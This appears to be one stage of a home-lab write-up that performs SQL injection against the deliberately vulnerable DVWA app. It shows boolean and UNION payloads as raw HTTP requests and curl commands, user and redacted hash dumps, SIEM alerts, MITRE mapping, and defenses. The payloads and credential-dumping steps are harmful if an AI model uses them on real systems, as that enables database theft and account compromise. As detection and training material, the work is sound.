# Stage 03 — SQL Injection

> **Status:** Complete — evidence attached
> **Case:** [Case 01](../../04-Investigation/Cases/case-01-web-compromise.md)
> **Investigation:** [Phase 1 Deep Dive](../../04-Investigation/Deep-Dive-Attack-Chain-Investigation.md#phase-1-rattling-the-doorknobs-reconnaissance--web-exploitation)
> **Evidence:** [attack](../../06-Resources/screenshots/attack-simulation/8.png) · [alert](../../06-Resources/screenshots/thehive-alert/5.png)

## Objective

Test DVWA's SQL injection flaw to see if we can manipulate database queries and dump user account records and password hashes straight out of the database.

## Commands

```bash
# 1. In-browser HTTP GET request: Boolean-based SQL Injection test
# Injected parameter value: 1' OR '1'='1
GET /vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit# HTTP/1.1
Host: 192.168.56.30
Cookie: PHPSESSID=session_token; security=low

# Equivalent curl verification:
curl -s -b "PHPSESSID=session_token; security=low" \
  "http://192.168.56.30/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"

# 2. In-browser HTTP GET request: UNION-based SQL Injection extracting user table records
# Injected parameter value: 1' UNION SELECT user, password FROM users-- -
GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users--+-&Submit=Submit# HTTP/1.1
Host: 192.168.56.30
Cookie: PHPSESSID=session_token; security=low

# Equivalent curl verification:
curl -s -b "PHPSESSID=session_token; security=low" \
  "http://192.168.56.30/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,+password+FROM+users--+-&Submit=Submit"
```

## What happened

1. **Getting into the app:** Armed with the credentials from Stage 02 (`admin:password`), I logged in and headed straight to the SQL Injection section (`/vulnerabilities/sqli/`).
2. **Testing the waters (Boolean injection):** In the User ID box, I typed the classic test: `1' OR '1'='1`. Because the backend PHP code just glued user input straight into the SQL query without parameterization (`SELECT first_name, last_name FROM users WHERE user_id = '$id'`), the `'1'='1'` condition was true for every single row. The app obligingly dumped every user on the system:
   - `admin admin`
   - `Gordon Brown`
   - `Hack Me`
   - `Pablo Picasso`
   - `Bob Smith`
3. **Dumping the password hashes (UNION injection):** Now that I knew the query returned two text fields, I chained a UNION query to pull usernames and password hashes: `1' UNION SELECT user, password FROM users-- -`. The `-- -` commented out the rest of the developer's original query. The page printed every user account alongside their unsalted MD5 password hash:
   - `admin`: `5f4dc***cf99` (redacted MD5 hash)
   - `gordonb`: `e99a1***e03` (redacted MD5 hash)
   - `1337`: `8d353***16b` (redacted MD5 hash)
   - `pablo`: `0d107***e9b7` (redacted MD5 hash)
   - `smithy`: `5f4dc***cf99` (redacted MD5 hash)

## Evidence

### Attack Screenshots

![Boolean SQL Injection Dumping All Database Users](../../06-Resources/screenshots/attack-simulation/8.png)
*Figure 3.1: Boolean SQL injection (1' OR '1'='1) returning all registered user profiles.*

![UNION-Based SQL Injection Exfiltrating User Hashes](../../06-Resources/screenshots/attack-simulation/9.png)
*Figure 3.2: UNION SELECT injection extracting usernames and MD5 password hashes from the users table.*

### Alert Screenshots

![TheHive Alert Detail - Suricata ET WEB_SERVER SELECT USER SQL Injection Attempt](../../06-Resources/screenshots/thehive-alert/5.png)
*Figure 3.3: TheHive Alert #11 (Sub-event 17) — Suricata rule 100600 (SID 2010963) capturing ET WEB_SERVER SELECT USER SQL Injection Attempt in URI from 192.168.232.135.*

## Alert observed

| Source | Rule / Signature | Rule ID | TheHive alert / Reference | Severity | Status |
|---|---|---|---|---|---|
| Suricata / Wazuh | `Suricata: [200] [192.168.232.135] [/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user...] [ET WEB_SERVER SELECT USER SQL Injection Attempt in URI]` | 100600 / ET SID 2010963 | TheHive Alert #11 (Sub-event 17, `5.png` / `wzb-6a22425401`) | High (3) / Medium (Suricata: 1) | **Detected** |

## MITRE ATT&CK

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credentials from Password Stores | T1555 |

## Detection opportunities

- **Network Signatures on HTTP Queries:** Suricata catches classic SQL patterns like `UNION SELECT`, `OR '1'='1'`, and comment delimiters (`--`) right on the wire. Signature `ET WEB_SERVER SELECT USER SQL Injection Attempt in URI` flagged this request immediately.
- **Web Application Firewall (WAF):** Tools like ModSecurity (OWASP Core Rule Set) block SQL metacharacters and tautology patterns before they ever hit backend PHP code.
- **Log Inspection in SIEM:** Wazuh rules can watch for URL-encoded SQL syntax (`%27`, `%23`, `UNION%20SELECT`) in GET and POST parameters.
- **Parameterized Queries (The Real Fix):** Prepared statements in PHP PDO completely neutralize SQL injection by treating user input strictly as data, never executable code.

## Notes

- Because the database was using raw, unsalted MD5 hashes, every extracted hash was an easy target for offline cracking in Stage 04.
- Suricata caught the `UNION SELECT` query on the wire and immediately passed the alert through Wazuh into TheHive.
